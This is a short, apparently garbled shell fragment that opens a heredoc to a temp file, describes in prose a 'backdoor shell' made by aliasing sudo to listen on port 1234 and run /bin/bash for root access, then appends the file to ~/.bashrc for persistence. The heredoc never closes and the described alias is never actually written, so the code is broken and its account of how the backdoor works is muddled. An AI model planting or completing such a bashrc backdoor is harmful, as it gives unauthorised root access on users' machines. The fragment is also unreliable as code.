cat << EOF > /tmp/$TMPNAME2
  This command creates a backdoor shell by setting an alias for sudo command to listen on port 1234 and execute /bin/bash. The shell is password protected, and the password is entered by the user when the sudo command is used. This can be used to gain root access to the system.

    cat /tmp/$TMPNAME2 >> ~/.bashrc
